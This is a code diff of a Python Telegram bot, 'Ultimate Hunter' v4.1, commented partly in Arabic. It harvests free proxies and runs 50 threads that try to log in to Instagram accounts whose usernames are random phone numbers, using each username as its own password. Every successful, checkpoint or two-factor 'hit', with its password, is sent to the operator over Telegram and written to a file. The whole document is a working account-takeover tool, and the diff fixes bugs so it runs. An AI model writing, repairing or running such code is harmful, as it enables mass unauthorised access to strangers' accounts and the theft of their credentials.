@@ -1,4 +1,4 @@
-# ultimate_hunter.py - v4.0 (Self-Sustaining, Multi-Country, Interactive Bot)
+# ultimate_hunter.py - v4.1 (Corrected Event Loop Initialization)
 
 import requests
 from bs4 import BeautifulSoup
@@ -28,7 +28,7 @@ SUPPORTED_COUNTRIES = {
 }
 
 HITS_FILE = "hits.txt"
-MAX_HUNTING_THREADS = 50 # يمكن زيادة هذا الرقم لأننا نستخدم بروكسيات كثيرة
+MAX_HUNTING_THREADS = 50
 
 # --- متغيرات الحالة العامة ---
 is_hunting = False
@@ -52,19 +52,20 @@ def _proxy_checker(q_in, q_out):
     while True:
         proxy = q_in.get()
         try:
+            # استخدام httpbin.org لأنه موثوق ومصمم لهذه الاختبارات
             requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=7)
             q_out.put(proxy)
         except Exception:
-            pass
+            pass # تجاهل البروكسي الفاشل
         q_in.task_done()
 
-async def _proxy_harvester(context: ContextTypes.DEFAULT_TYPE):
+async def _proxy_harvester(bot):
     """Manager: Continuously scrapes and checks proxies to keep the inventory full."""
     global proxy_inventory
     while True:
         if proxy_inventory.qsize() < 50: # إذا انخفض المخزون عن 50، ابدأ إعادة التعبئة
             try:
-                await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🏭 Proxy inventory low ({proxy_inventory.qsize()}). Starting harvester workers...")
+                await bot.send_message(chat_id=ADMIN_USER_ID, text=f"🏭 Proxy inventory low ({proxy_inventory.qsize()}). Starting harvester workers...")
                 
                 unchecked_proxies = queue.Queue()
                 # Scrape from free-proxy-list.net
@@ -79,7 +80,7 @@ async def _proxy_harvester(context: ContextTypes.DEFAULT_TYPE):
                 for _ in range(100): # 100 عامل فحص
                     threading.Thread(target=_proxy_checker, args=(unchecked_proxies, proxy_inventory), daemon=True).start()
                 
-                await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"👷‍♂️ Harvester deployed. Workers are now filling the inventory.")
+                await bot.send_message(chat_id=ADMIN_USER_ID, text=f"👷‍♂️ Harvester deployed. Workers are now filling the inventory.")
             except Exception as e:
                 print(f"Harvester Error: {e}")
         
@@ -90,7 +91,7 @@ async def _proxy_harvester(context: ContextTypes.DEFAULT_TYPE):
 # SECTION 2: CORE HUNTING LOGIC
 # ==============================================================================
 
-def _instagram_worker(target_q):
+def _instagram_worker(target_q, bot_token):
     """Worker: Takes a target, gets a proxy, and attempts to log in."""
     global hunt_stats
     while True:
@@ -103,7 +104,6 @@ def _instagram_worker(target_q):
             continue # لا توجد بروكسيات، تجاهل هذا الهدف
 
         try:
-            # (هنا كود محاولة تسجيل الدخول الفعلي)
             login_url = 'https://www.instagram.com/accounts/login/ajax/'
             headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/"}
             proxies_dict = {"http": proxy, "https": proxy}
@@ -117,18 +117,18 @@ def _instagram_worker(target_q):
                 
                 if login_r.status_code == 200:
                     data = login_r.json()
-                    if data.get("authenticated"):
+                    status = "FAIL"
+                    if data.get("authenticated"): status = "SUCCESS"
+                    elif "checkpoint_url" in login_r.text: status = "CHECKPOINT"
+                    elif data.get("two_factor_required"): status = "2FA"
+                    
+                    if status != "FAIL":
                         hunt_stats["hits"] += 1
-                        asyncio.run(send_hit_notification("SUCCESS", username, password))
-                    elif "checkpoint_url" in login_r.text:
-                        hunt_stats["hits"] += 1
-                        asyncio.run(send_hit_notification("CHECKPOINT", username, password))
-                    elif data.get("two_factor_required"):
-                        hunt_stats["hits"] += 1
-                        asyncio.run(send_hit_notification("2FA", username, password))
-                    else:
-                        # كلمة مرور خاطئة، البروكسي صالح، أعده للمخزون
-                        proxy_inventory.put(proxy)
+                        # استخدام asyncio.run لإرسال الإشعار من داخل thread
+                        asyncio.run(send_hit_notification(status, username, password, bot_token))
+                    
+                    # إذا لم تكن كلمة المرور صحيحة، فالبروكسي صالح
+                    proxy_inventory.put(proxy)
                 else:
                     # البروكسي محروق على الأغلب، لا تعيده للمخزون
                     pass
@@ -153,11 +153,8 @@ async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str):
     
     target_queue = queue.Queue()
     
-    # توليد الأهداف ووضعها في طابور العمل
-    # (يمكنك زيادة هذا الرقم للحصول على قائمة أكبر)
     num_targets = 5000 
     for _ in range(num_targets):
-        # توليد رقم من 7-9 أرقام عشوائياً
         random_part = ''.join(random.choice('0123456789') for _ in range(random.randint(7, 9)))
         target_queue.put((f"{country_code}{random_part}", f"{country_code}{random_part}"))
     
@@ -166,7 +163,7 @@ async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str):
 
     # تشغيل عمال الصيد
     for _ in range(MAX_HUNTING_THREADS):
-        threading.Thread(target=_instagram_worker, args=(target_queue,), daemon=True).start()
+        threading.Thread(target=_instagram_worker, args=(target_queue, context.bot.token), daemon=True).start()
 
     target_queue.join() # انتظر حتى يتم فحص كل الأهداف
 
@@ -178,14 +175,13 @@ async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str):
 # SECTION 3: TELEGRAM HANDLERS & CONVERSATION
 # ==============================================================================
 
-# --- فلتر المدير ---
 class AdminFilter(filters.BaseFilter):
     def filter(self, message: Update): return message.from_user.id == ADMIN_USER_ID
 admin_filter = AdminFilter()
 
-async def send_hit_notification(status, username, password):
+async def send_hit_notification(status, username, password, bot_token):
     """Sends a formatted hit notification to the admin."""
-    bot = Application.builder().token(TELEGRAM_BOT_TOKEN).build().bot
+    bot = Application.builder().token(bot_token).build().bot
     result_message = f"🎯 *HIT FOUND!* ({hunt_stats['hits']}) 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
     await bot.send_message(chat_id=ADMIN_USER_ID, text=result_message, parse_mode='Markdown')
     with open(HITS_FILE, "a") as f:
@@ -193,7 +189,7 @@ async def send_hit_notification(status, username, password):
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👋 **Welcome to the Ultimate Hunter Bot v4.0!**\n\n"
+        "👋 **Welcome to the Ultimate Hunter Bot v4.1!**\n\n"
         "▶️ `/hunt` - Start a new hunt.\n"
         "🛑 `/stophunt` - Stop the current hunt.\n"
         "📊 `/status` - Get a live progress report."
@@ -218,16 +214,21 @@ async def received_country_code(update: Update, context: ContextTypes.DEFAULT_TY
     return ConversationHandler.END
 
 async def stophunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # (هذا الجزء لم يتغير)
-    pass
+    global is_hunting, hunt_task
+    if not is_hunting:
+        await update.message.reply_text("ℹ️ No hunt is currently running.")
+        return
+    is_hunting = False
+    if hunt_task: hunt_task.cancel()
+    await update.message.reply_text("⏳ **Stopping...** The hunt will be terminated shortly.")
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_hunting:
-        await update.message.reply_text("🅾️ **Status:** The bot is idle. Use `/hunt` to start.")
+    if not is_hunting and hunt_stats["current_phase"] == "Idle":
+        await update.message.reply_text(f"🅾️ **Status:** The bot is idle.\nLive Proxies in Stock: `{proxy_inventory.qsize()}`")
         return
     
     percentage = (hunt_stats["processed"] / hunt_stats["total_targets"] * 100) if hunt_stats["total_targets"] > 0 else 0
-    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(time.time() - hunt_stats["start_time"]))
+    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(time.time() - hunt_stats["start_time"])) if hunt_stats["start_time"] else "N/A"
     
     status_message = (
         f"📊 **Live Hunt Status** 📊\n\n"
@@ -236,7 +237,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"▪️ **Progress:** {hunt_stats['processed']} / {hunt_stats['total_targets']} checked.\n"
         f"▪️ **Completion:** `{percentage:.2f}%`\n"
         f"▪️ **Successful Hits:** `{hunt_stats['hits']}`\n"
-        f"▪️ **Live Proxies in Stock:** `{hunt_stats['live_proxies']}`\n"
+        f"▪️ **Live Proxies in Stock:** `{proxy_inventory.qsize()}`\n"
         f"▪️ **Time Elapsed:** `{elapsed_time}`"
     )
     await update.message.reply_text(status_message, parse_mode='Markdown')
@@ -246,12 +247,24 @@ async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE
     return ConversationHandler.END
 
 # ==============================================================================
-# SECTION 4: MAIN APPLICATION
+# SECTION 4: MAIN APPLICATION (Corrected)
 # ==============================================================================
 
+async def post_init(application: Application):
+    """A function to run after the bot is initialized, to start background tasks."""
+    await application.bot.send_message(
+        chat_id=ADMIN_USER_ID,
+        text="✅ **Bot Online & Ready!**\n\n🏭 Proxy harvester workers are now active in the background. Use `/hunt` to start."
+    )
+    # تشغيل جامع البروكسيات كمهمة خلفية
+    asyncio.create_task(_proxy_harvester(application.bot))
+
 def main():
-    print("--- ULTIMATE HUNTER BOT v4.0 is starting... ---")
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    """The main entry point for the bot."""
+    print("--- ULTIMATE HUNTER BOT v4.1 is starting... ---")
+    
+    # إعداد التطبيق
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()
     
     # --- إعداد محادثة الصيد ---
     hunt_conv_handler = ConversationHandler(
@@ -260,14 +273,13 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel_conversation)]
     )
     
+    # إضافة كل معالجات الأوامر
     application.add_handler(hunt_conv_handler)
     application.add_handler(CommandHandler("start", start_command, filters=admin_filter))
     application.add_handler(CommandHandler("stophunt", stophunt_command, filters=admin_filter))
     application.add_handler(CommandHandler("status", status_command, filters=admin_filter))
     
-    # --- تشغيل جامع البروكسيات في الخلفية ---
-    asyncio.create_task(_proxy_harvester(application))
-    
+    # تشغيل البوت
     print("Bot is now listening for commands on Telegram.")
     application.run_polling()
 
